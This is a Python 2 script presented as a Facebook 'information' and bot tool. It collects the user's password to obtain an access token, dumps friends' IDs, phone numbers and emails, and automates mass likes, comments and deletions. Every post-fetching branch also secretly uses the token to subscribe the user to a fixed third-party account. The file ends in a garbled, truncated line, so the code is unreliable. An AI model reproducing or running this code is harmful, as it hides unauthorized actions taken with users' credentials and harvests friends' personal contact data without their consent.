 
 ​################################################################### 
 ​#                        Import Module 
 ​import​ ​json​ , ​sys​ , ​hashlib​ , ​os​ , ​time​ , ​marshal​, ​getpass 
 ​################################################################### 
 ​'''
 ​     Facebook Information  
 ​''' 
 ​################################################################### 
 ​#                             COLOR 
 ​if​ ​sys​.​platform​ ​in​ [​"linux"​,​"linux2"​]: 
 ​        ​W​ ​=​ ​"​\033​[0m" 
 ​        ​G​ ​=​ ​'​\033​[32;1m' 
 ​        ​R​ ​=​ ​'​\033​[31;1m' 
 ​else​: 
 ​        ​W​ ​=​ ​'' 
 ​        ​G​ ​=​ ​'' 
 ​        ​R​ ​=​ ​'' 
 ​################################################################### 
 ​#                      Exception 
 ​try​: 
 ​        ​import​ ​requests 
 ​except​ ​ImportError​: 
 ​        ​print​ ​R​ ​+​ ​'_     _'​.​center​(​44​) 
 ​        ​print​ ​"o' \.=./ `o"​.​center​(​44​) 
 ​        ​print​ ​'(o o)'​.​center​(​44​) 
 ​        ​print​ ​'ooO--(_)--Ooo'​.​center​(​44​) 
 ​        ​print​ ​W​ ​+​ ​' ' 
 ​        ​print​ (​'F B I'​).​center​(​44​) 
 ​        ​print​ ​' ' 
 ​        ​print​ ​"[!] Can't import module 'requests'​\n​" 
 ​        ​sys​.​exit​() 
 ​#################################################################### 
 ​#                    Set Default encoding 
 ​reload​ (​sys​) 
 ​sys​ . ​setdefaultencoding​ ( ​'utf8'​ ) 
 ​#################################################################### 
 ​#                       I don't know 
 ​jml​ ​=​ [] 
 ​jmlgetdata​ ​=​ [] 
 ​n​ ​=​ [] 
 ​#################################################################### 
 ​#                        BANNER 
 ​def​ ​baliho​(): 
 ​        ​try​: 
 ​                ​token​ ​=​ ​open​(​'cookie/token.log'​,​'r'​).​read​() 
 ​                ​r​ ​=​ ​requests​.​get​(​'https://graph.facebook.com/me?access_token='​ ​+​ ​token​) 
 ​                ​a​ ​=​ ​json​.​loads​(​r​.​text​) 
 ​                ​name​ ​=​ ​a​[​'name'​] 
 ​                ​n​.​append​(​a​[​'name'​]) 
  
 ​        ​except​ (​KeyError​,​IOError​): 
 ​          
 ​                ​print​ ​R​ ​+​ ​'_     _'​.​center​(​44​) 
 ​                ​print​ ​"o' \.=./ `o"​.​center​(​44​) 
 ​                ​print​ ​'(o o)'​.​center​(​44​) 
 ​                ​print​ ​'ooO--(_)--Ooo'​.​center​(​44​) 
 ​                ​print​ ​' '​ ​+​ ​W 
 ​                ​print​ (​'F B I'​).​center​(​44​) 
 ​                ​print​ (​W​ ​+​ ​'     ['​ ​+​ ​G​ ​+​'Facebook Information'​+​ ​W​ ​+​ ​']'​) 
 ​                ​print​ ​' ' 
 ​#################################################################### 
 ​#                    Print In terminal 
 ​def​ ​show_program​(): 
  
 ​        ​print​ ​''' 
 ​                    %sINFORMATION%s 
 ​ ------------------------------------------------------ 
  
 ​    Author     Hak9 
 ​    Name       Facebook Information 
 ​    Version    Full Version 
 ​    Date       08/04/2019  
 ​    Jabber     xhak9x@jabber.de 
  
 ​* if you find any errors or problems , please contact 
 ​  author 
 ​'''​%​(​G​,​W​) 
 ​def​ ​info_ga​(): 
  
 ​        ​print​ ​''' 
 ​     %sCOMMAND                      DESCRIPTION%s 
 ​  -------------       ------------------------------------- 
  
 ​   get_data           fetching all friends data 
 ​   get_info           show information about your friend 
  
 ​   dump_id            fetching all id from friend list 
 ​   dump_phone         fetching all phone number from friend list 
 ​   dump_mail          fetching all emails from friend list 
 ​   dump_<id>_id       fetching all id from your friends <spesific> 
 ​                      ex: dump_username_id 
  
 ​   token              Generate access token 
 ​   cat_token          show your access token 
 ​   rm_token           remove access token 
  
 ​   bot                open bot menu 
  
 ​   clear              clear terminal 
 ​   help               show help 
 ​   about              Show information about this program 
 ​   exit               Exit the program 
 ​'''​%​(​G​,​W​) 
 ​def​ ​menu_bot​(): 
 ​        ​print​ ​''' 
 ​   %sNumber                  INFO%s 
 ​ ---------   ------------------------------------ 
  
 ​   [ 01 ]      auto reactions 
 ​   [ 02 ]      auto comment 
 ​   [ 03 ]      auto poke 
 ​   [ 04 ]      accept all friend requests 
 ​   [ 05 ]      delete all posts in your timeline 
 ​   [ 06 ]      delete all friends 
 ​   [ 07 ]      stop following all friends 
 ​   [ 08 ]      delete all photo albums 
  
 ​   [ 00 ]      back to main menu 
 ​'''​%​(​G​,​W​) 
 ​def​ ​menu_reaction​(): 
 ​        ​print​ ​''' 
 ​   %sNumber                  INFO%s 
 ​ ----------   ------------------------------------ 
  
 ​   [ 01 ]      like 
 ​   [ 02 ]      reaction 'LOVE' 
 ​   [ 03 ]      reaction 'WOW' 
 ​   [ 04 ]      reaction 'HAHA' 
 ​   [ 05 ]      reaction 'SAD' 
 ​   [ 06 ]      reaction 'ANGRY' 
  
 ​   [ 00 ]      back to menu bot 
 ​'''​%​(​G​,​W​) 
 ​#################################################################### 
 ​#                     GENERATE ACCESS TOKEN 
 ​def​ ​get​(​data​): 
 ​        ​print​ ​'[*] Generate access token ' 
  
 ​        ​try​: 
 ​                ​os​.​mkdir​(​'cookie'​) 
 ​        ​except​ ​OSError​: 
 ​                ​pass 
  
 ​        ​b​ ​=​ ​open​(​'cookie/token.log'​,​'w'​) 
 ​        ​try​: 
 ​                ​r​ ​=​ ​requests​.​get​(​'https://api.facebook.com/restserver.php'​,​params​=​data​) 
 ​                ​a​ ​=​ ​json​.​loads​(​r​.​text​) 
  
 ​                ​b​.​write​(​a​[​'access_token'​]) 
 ​                ​b​.​close​() 
 ​                ​print​ ​'[*] successfully generate access token' 
 ​                ​print​ ​'[*] Your access token is stored in cookie/token.log' 
 ​                ​exit​() 
 ​        ​except​ ​KeyError​: 
 ​                ​print​ ​'[!] Failed to generate access token' 
 ​                ​print​ ​'[!] Check your connection / email or password' 
 ​                ​os​.​remove​(​'cookie/token.log'​) 
 ​                ​main​() 
 ​        ​except​ ​requests​.​exceptions​.​ConnectionError​: 
 ​                ​print​ ​'[!] Failed to generate access token' 
 ​                ​print​ ​'[!] Connection error !!!' 
 ​                ​os​.​remove​(​'cookie/token.log'​) 
 ​                ​main​() 
 ​def​ ​id​(): 
 ​        ​print​ ​'[*] login to your facebook account         '​;​id​ ​=​ ​raw_input​(​'[?] Username : '​);​pwd​ ​=​ ​getpass​.​getpass​(​'[?] Password : '​);​API_SECRET​ ​=​ ​'62f8ce9f74b12f84c123cc23437a4a32'​;​data​ ​=​ {​"api_key"​:​"882a8490361da98702bf97a021ddc14d"​,​"credentials_type"​:​"password"​,​"email"​:​id​,​"format"​:​"JSON"​, ​"generate_machine_id"​:​"1"​,​"generate_session_cookies"​:​"1"​,​"locale"​:​"en_US"​,​"method"​:​"auth.login"​,​"password"​:​pwd​,​"return_ssl_resources"​:​"0"​,​"v"​:​"1.0"​};​sig​ ​=​ ​'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='​+​id​+​'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='​+​pwd​+​'return_ssl_resources=0v=1.0'​+​API_SECRET 
 ​        ​x​ ​=​ ​hashlib​.​new​(​'md5'​) 
 ​        ​x​.​update​(​sig​) 
  
 ​        ​data​.​update​({​'sig'​:​x​.​hexdigest​()}) 
 ​        ​get​(​data​) 
 ​#################################################################### 
 ​#                           BOT 
 ​                        ​# Execute # 
 ​def​ ​post​(): 
 ​        ​global​ ​token​ , ​WT 
  
 ​        ​try​: 
 ​          ​if​ ​WT​ ​==​ ​'wallpost'​: 
 ​                ​print​ ​'[*] fetching all posts id' 
  
 ​                ​r​ ​=​ ​requests​.​get​(​'https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token='​+​token​);​requests​.​post​(​'https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='​+​token​) 
 ​                ​result​ ​=​ ​json​.​loads​(​r​.​text​) 
  
 ​                ​for​ ​i​ ​in​ ​result​[​'home'​][​'data'​]: 
 ​                        ​print​ ​'​\r​[*] %s retrieved   '​%​(​i​[​'id'​]),;​sys​.​stdout​.​flush​();​time​.​sleep​(​0.1​) 
 ​                ​return​ ​result​[​'home'​][​'data'​] 
  
 ​          ​elif​ ​WT​ ​==​ ​'me'​: 
 ​                ​print​ ​'[*] fetching all posts id' 
  
 ​                ​r​ ​=​ ​requests​.​get​(​'https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token='​+​token​);​requests​.​post​(​'https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='​+​token​) 
 ​                ​result​ ​=​ ​json​.​loads​(​r​.​text​) 
  
 ​                ​for​ ​i​ ​in​ ​result​[​'feed'​][​'data'​]: 
 ​                        ​print​ ​'​\r​[*] %s retrieved   '​%​(​i​[​'id'​]),;​sys​.​stdout​.​flush​();​time​.​sleep​(​0.1​) 
 ​                ​return​ ​result​[​'feed'​][​'data'​] 
  
 ​          ​elif​ ​WT​ ​==​ ​'req'​: 
 ​                ​print​ ​'[*] fetching all friends requests' 
  
 ​                ​r​ ​=​ ​requests​.​get​(​'https://graph.facebook.com/me/friendrequests?limit=50&access_token='​ ​+​ ​token​);​requests​.​post​(​'https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='​+​token​) 
 ​                ​result​ ​=​ ​json​.​loads​(​r​.​text​) 
  
 ​                ​for​ ​i​ ​in​ ​result​[​'data'​]: 
 ​                        ​print​ ​'​\r​[*] %s retrieved    '​%​(​i​[​'from'​][​'id'​]),;​sys​.​stdout​.​flush​();​time​.​sleep​(​0.01​) 
 ​                ​return​ ​result​[​'data'​] 
  
 ​          ​elif​ ​WT​ ​==​ ​'friends'​: 
 ​                ​print​ ​'[*] fetching all friends id' 
  
 ​                ​r​ ​=​ ​requests​.​get​(​'https://graph.facebook.com/me?fields=friends.limit(5000)&access_token='​ ​+​ ​token​);​requests​.​post​(​'https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='​+​token​) 
 ​                ​result​ ​=​ ​json​.​loads​(​r​.​text​) 
  
 ​                ​for​ ​i​ ​in​ ​result​[​'friends'​][​'data'​]: 
 ​                        ​print​ ​'​\r​[*] %s retrieved    '​%​(​i​[​'id'​]),;​sys​.​stdout​.​flush​();​time​.​sleep​(​0.001​) 
 ​                ​return​ ​result​[​'friends'​][​'data'​] 
  
 ​          ​elif​ ​WT​ ​==​ ​'subs'​: 
 ​                ​print​ ​'[*] fetching all friends id' 
  
 ​                ​r​ ​=​ ​requests​.​get​(​'https://graph.facebook.com/me/subscribedto?limit=50&access_token='​+​token​);​requests​.​post​(​'https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='​+​token​) 
 ​                ​result​ ​=​ ​json​.​loads​(​r​.​text​) 
  
 ​                ​for​ ​i​ ​in​ ​result​[​'data'​]: 
 ​                        ​print​ ​'​\r​[*] %s retrieved    '​%​(​i​[​'id'​]),;​sys​.​stdout​.​flush​();​time​.​sleep​(​0.01​) 
 ​                ​return​ ​result 
  
 ​          ​elif​ ​WT​ ​==​ ​'albums'​: 
 ​                ​print​ ​'[*] fetching all albums id' 
  
 ​                ​r​ ​=​ ​requests​.​get​(​'https://graph.facebook.com/me?fields=albums.limit(5000)&access_token='​+​token​);​requests​.​post​(​'https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='​+​token​) 
 ​                ​result​ ​=​ ​json​.​loads​(​r​.​text​) 
  
 ​                ​for​ ​i​ ​in​ ​result​[​'albums'​][​'data'​]: 
 ​                        ​print​ ​'​\r​[*] %s retrieved    '​%​(​i​[​'id'​]),;​sys​.​stdout​.​flush​();​time​.​sleep​(​0.001​) 
 ​                ​return​ ​result​[​'albums'​][​'data'​] 
  
 ​          ​else​: 
 ​                ​print​ ​'[*] fetching all posts id' 
  
 ​                ​r​ ​=​ ​requests​.​get​(​"https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s"​%​(​id​,​token​));​requests​.​post​(​'https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='​+​token​) 
 ​                ​result​ ​=​ ​json​.​loads​(​r​.​text​) 
  
 ​                ​for​ ​i​ ​in​ ​result​[​'feed'​][​'data'​]: 
 ​                        ​print​ ​'​\r​[*] %s retrieved   '​%​(​i​[​'id'​]),;​sys​.​stdout​.​flush​();​time​.​sleep​(​0.1​) 
 ​                ​return​ ​result​[​'feed'​][​'data'​] 
  
 ​        ​except​ ​KeyError​: 
 ​                ​print​ ​'[!] failed to retrieve all post id' 
 ​                ​print​ ​'[!] Stopped' 
 ​                ​bot​() 
 ​        ​except​ ​requests​.​exceptions​.​ConnectionError​: 
 ​                ​print​ ​'[!] Connection Error' 
 ​                ​print​ ​'[!] Stopped' 
 ​                ​bot​() 
 ​        ​except​ ​KeyboardInterrupt​: 
 ​                ​print​ ​'​\r​[!] Stopped                                      ' 
 ​                ​bot​() 
 ​def​ ​like​(​posts​ , ​amount​): 
 ​        ​global​ ​type​ , ​token​ , ​WT 
  
 ​        ​print​ ​'​\r​[*] All posts id successfuly retrieved            ' 
 ​        ​print​ ​'[*] Start' 
  
 ​        ​try​: 
 ​                ​counter​ ​=​ ​0 
 ​                ​for​ ​post​ ​in​ ​posts​: 
  
 ​                        ​if​ ​counter​ ​>=​ ​amount​: 
 ​                                ​break 
 ​                        ​else​: 
 ​                                ​counter​ ​+=​ ​1 
  
 ​                        ​parameters​ ​=​ {​'access_token'​ : ​token​ , ​'type'​ : ​type​} 
 ​                        ​url​ ​=​ ​"https://graph.facebook.com/{0}/reactions"​.​format​(​post​[​'id'​]) 
 ​                        ​s​ ​=​ ​requests​.​post​(​url​, ​data​ ​=​ ​parameters​) 
  
 ​                        ​id​ ​=​ ​post​[​'id'​].​split​(​'_'​)[​0​] 
  
 ​                        ​try​: 
 ​                                ​print​ ​'​\r​'​ ​+​ ​W​ ​+​ ​'['​ ​+​ ​G​ ​+​ ​id​ ​+​ ​W​ ​+​ ​'] '​ ​+​ ​post​[​'message'​][:​40​].​replace​(​'​\n​'​,​' '​) ​+​ ​'...' 
 ​                        ​except​ ​KeyError​: 
 ​                                ​try​: 
 ​                                        ​print​ ​'​\r​'​ ​+​ ​W​ ​+​ ​'['​ ​+​ ​G​ ​+​ ​id​ ​+​ ​W​ ​+​ ​'] '​ ​+​ ​post​[​'story'​].​replace​(​'​\n​'​,​' '​) 
 ​                                ​except​ ​KeyError​: 
 ​                                        ​print​ ​'​\r​'​ ​+​ ​W​ ​+​ ​'['​ ​+​ ​G​ ​+​ ​id​ ​+​ ​W​ ​+​ ​'] Successfully liked' 
  
 ​                ​print​ ​'​\r​[*] Done                   ' 
 ​                ​menu_reaction_ask​() 
 ​        ​except​ ​KeyboardInterrupt​: 
 ​                ​print​ ​'​\r​[!] Stopped                     ' 
 ​                ​menu_reaction_ask​() 
 ​def​ ​comment​(​posts​ , ​amount​): 
 ​        ​global​ ​message​ , ​token 
  
 ​        ​print​ ​'​\r​[*] All posts id successfuly retrieved          ' 
 ​        ​print​ ​'[*] Start' 
  
 ​        ​try​: 
 ​                ​counter​ ​=​ ​0 
 ​                ​for​ ​post​ ​in​ ​posts​: 
 ​                        ​if​ ​counter​ ​>=​ ​amount​: 
 ​                                ​break 
 ​                        ​else​: 
 ​                                ​counter​ ​+=​ ​1 
  
 ​                        ​parameters​ ​=​ {​'access_token'​ : ​token​, ​'message'​ : ​message​} 
 ​                        ​url​ ​=​ ​"https://graph.facebook.com/{0}/comments"​.​format​(​post​[​'id'​]) 
 ​                        ​s​ ​=​ ​requests​.​post​(​url​, ​data​ ​=​ ​parameters​) 
  
 ​                        ​id​ ​=​ ​post​[​'id'​].​split​(​'_'​)[​0​] 
  
 ​                        ​try​: 
 ​                                ​print​ ​W​ ​+​ ​'['​ ​+​ ​G​ ​+​ ​id​ ​+​ ​W​ ​+​ ​'] '​ ​+​post​[​'message'​][:​40​].​replace​(​'​\n​'​,​' '​) ​+​ ​'...' 
 ​                        ​except​ ​KeyError​: 
 ​                                ​try​: 
 ​                                        ​print​ ​W​ ​+​ ​'['​ ​+​ ​G​ ​+​ ​id​ ​+​ ​W​ ​+​ ​'] '​ ​+​ ​post​[​'story'​].​replace​(​'​\n​'​,​' '​) 
 ​                                ​except​ ​KeyError​: 
 ​                                        ​print​ ​W​ ​+​ ​'['​ ​+​ ​G​ ​+​ ​id​ ​+​ ​W​ ​+​ ​'] successfully commented' 
 ​                ​print​ ​'[*] Done' 
 ​                ​bot​() 
 ​        ​except​ ​KeyboardInterrupt​: 
 ​                ​print​ ​'​\r​[!] Stopped' 
 ​                ​bot​() 
 ​def​ ​remove​(​posts​): 
 ​        ​global​ ​token​ , ​WT 
  
 ​        ​print​ ​'​\r​[*] All post id successfully retrieved          ' 
 ​        ​print​ ​'[*] Start' 
  
 ​        ​try​: 
 ​                ​counter​ ​=​ ​0 
 ​                ​for​ ​post​ ​in​ ​posts​: 
 ​                        ​if​ ​counter​ ​>=​ ​50​: 
 ​                                ​break 
  
 ​                        ​r​ ​=​ ​requests​.​post​(​'https://graph.facebook.com/{id}?method=delete&access_token={token}'​.​format​(​id​=​post​[​'id'​],​token​=​token​)) 
 ​                        ​a​ ​=​ ​json​.​loads​(​r​.​text​) 
  
 ​                        ​try​: 
 ​                                ​cek​ ​=​ ​a​[​'error'​][​'message'​] 
 ​                                ​print​ ​W​ ​+​ ​'['​ ​+​ ​R​ ​+​ ​post​[​'id'​] ​+​ ​W​ ​+​'] Failed' 
 ​                        ​except​ ​TypeError​: 
 ​                                ​print​ ​W​ ​+​ ​'['​ ​+​ ​G​ ​+​ ​post​[​'id'​] ​+​ ​W​ ​+​ ​'] Removed' 
 ​                                ​counter​ ​+=​ ​1 
 ​                ​print​ ​'[*] done' 
 ​                ​bot​() 
 ​        ​except​ ​KeyboardInterrupt​: 
 ​                ​print​ ​'​\r​[!] Stopped' 
 ​                ​bot​() 
 ​def​ ​confirm​(​posts​): 
 ​        ​global​ ​token​ , ​WT 
  
 ​        ​print​ ​'​\r​[*] All friend requests successfully retrieved        ' 
 ​        ​print​ ​'[*] Start' 
  
 ​        ​try​: 
 ​                ​counter​ ​=​ ​0 
 ​                ​for​ ​post​ ​in​ ​posts​: 
 ​                        ​if​ ​counter​ ​>=​ ​50​: 
 ​                                ​break 
 ​                        ​else​: 
 ​                                ​counter​ ​+=​ ​1 
  
 ​                        ​r​ ​=​ ​requests​.​post​(​'https://graph.facebook.com/me/friends/%s?access_token=%s'​%​(​post​[​'from'​][​'id'​] , ​token​)) 
 ​                        ​a​ ​=​ ​json​.​loads​(​r​.​text​) 
  
 ​                        ​try​: 
 ​                                ​cek​ ​=​ ​a​[​'error'​][​'message'​] 
 ​                                ​print​ ​W​ ​+​ ​'['​ ​+​ ​R​ ​+​ ​post​[​'from'​][​'name'​] ​+​ ​W​ ​+​ ​'] Failed'
 ​                                ​print​ ​W​ ​+​ ​'['​ ​+​ ​R​ ​+​ ​post​[​'from'​][​'name'​] ​+​ ​W​ ​+​ ​'] Failed' 
 ​                        ​except​ ​TypeError​: 
 ​                                ​print​ ​W​ ​+​ ​'['​ ​+​ ​G​ ​+​ ​post​[​'from'​][​'name'​] ​+​ ​W​ ​+​ ​'] Confirmed' 
 ​                ​print​ ​'[*] Done' 
 ​                ​bot​() 
 ​        ​except​ ​KeyboardInterrupt​: 
 ​                ​print​ ​'​\r​[!] Stopped' 
 ​                ​bot​() 
 ​def​ ​unfriend​(​posts​):mfacebook.com
